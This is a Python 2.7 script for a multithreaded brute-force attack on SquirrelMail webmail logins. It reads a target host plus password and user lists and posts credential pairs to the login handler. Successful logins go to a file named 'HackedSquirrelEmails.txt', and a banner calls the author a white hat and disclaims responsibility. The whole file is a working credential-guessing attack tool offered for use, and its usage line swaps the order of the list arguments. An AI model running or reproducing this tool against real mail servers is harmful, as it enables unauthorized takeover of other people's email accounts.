# coding=utf-8
# python2.7
import sys, threading, time, os
try:
    import requests
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install requests')
    print('   [-] you need to install requests Module')
    sys.exit()


class squirrelmail(object):
    def __init__(self):
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        try:
            site = sys.argv[1]
            if site.startswith('http://'):
                site = site.replace('http://', '')
            elif site.startswith("https://"):
                site = site.replace('https://', '')
            else:
                pass
            passwords = open(sys.argv[2], 'r').read().splitlines()
            users = open(sys.argv[3], 'r').read().splitlines()
        except:
            self.cls()
            self.print_logo()
            print('{}     ------------------------------------------------------'.format(self.y))
            print('{}          USAGE:{} python {} Target.com users.txt passwords.txt'.format(self.y, self.w, sys.argv[0]))
            sys.exit()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                   'Accept': '*/*'}
        try:
            CheckMailer = requests.get('http://' + site + '/src/login.php', timeout=10, headers=headers)
            if '<input type="password" name="secretkey"' in CheckMailer.text.encode('utf-8'):
                pass
            else:
                print('  ERRoR : {} --> Not Found!'.format(site + '/src/login.php'))
                sys.exit()
        except Exception, e:
            print('{}Error In Request:{} {}'.format(self.r, self.w, e))
        self.cls()
        self.print_logo()
        thread = []
        for user in users:
            self.flag = 0
            for password in passwords:
                if self.flag == 1:
                    break
                else:
                    t = threading.Thread(target=self.BF, args=(site, user, password))
                    t.start()
                    thread.append(t)
                    time.sleep(0.05)
        for j in thread:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def TimeStarT(self):
        return self.g + 'Time: ' + self.w + str(time.asctime()) + self.rr

    def BF(self, url, user, password):
        try:
            ReqPath = 'http://{}/{}'.format(url, '/src/redirect.php')
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                       'Accept': '*/*'}
            POST_DATA = {
                'login_username': user,
                'secretkey': password,
                'js_autodetect_results': 1,
                'just_logged_in': 1
            }
            GOT = requests.post(ReqPath, headers=headers, timeout=10, data=POST_DATA)
            if '<FONT COLOR="#CC0000"><B>ERROR</B></FONT>' in GOT.text.encode('utf-8'):
                print('     {}{}{}:{}{} {}-->{} Not Successfully'.format(self.w, user, self.y, self.w, password, self.c, self.r))
            else:
                print('     {}{}{}:{}{} {}-->{} Successfully'.format(self.w, user, self.y, self.w, password, self.c, self.g))
                with open('HackedSquirrelEmails.txt', 'a') as WwT:
                    WwT.write('--------------------------------------'
                              '\n{}/src/login.php\n{}:{}\n'.format(url, user, password))
                self.flag = 1
        except Exception, e:
            print('{}Error In Request:{} {}'.format(self.r, self.w, e))

    def print_logo(self):
        r = '\033[31m'
        g = '\033[32m'
        w = '\033[37m'
        x = """
                {}
      {}    _____             _               ____  ___      _ _  ____________ 
      {}   /  ___|           (_)             | |  \/  |     (_) | | ___ \  ___|
      {}   \ `--.  __ _ _   _ _ _ __ _ __ ___| | .  . | __ _ _| | | |_/ / |_  Github.com/04x
      {}    `--. \/ _` | | | | | '__| '__/ _ \ | |\/| |/ _` | | | | ___ \  _|  
      {}   /\__/ / (_| | |_| | | |  | | |  __/ | |  | | (_| | | | | |_/ / |  White Hat Hacker 
      {}   \____/ \__, |\__,_|_|_|  |_|  \___|_\_|  |_/\__,_|_|_| \____/\_|    
      {}             | |{} Note! : {}We don't Accept any responsibility for any illegal usage.  
      {}             |_|                                                       

    """.format(self.TimeStarT(), g, g, g, w, w, r, r, self.y, self.c, r)
        print(x)

if __name__ == '__main__':
    squirrelmail()
